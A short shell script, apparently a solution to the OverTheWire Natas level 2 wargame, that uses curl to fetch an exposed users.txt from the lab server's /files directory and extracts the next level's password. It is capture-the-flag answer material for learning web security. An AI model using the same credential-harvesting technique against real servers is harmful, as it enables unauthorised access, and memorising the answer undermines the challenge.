#!/bin/echo Please source

## Hints
## Since the `pixel.png` is located in `/files`, we target `/files` in hopes of viewing more leaked more files.

export natas3pass=$(curl -s -u natas2:$natas2pass http://natas2.natas.labs.overthewire.org/files/users.txt | grep natas3 | sed 's/natas3://')
echo natas3: $natas3pass
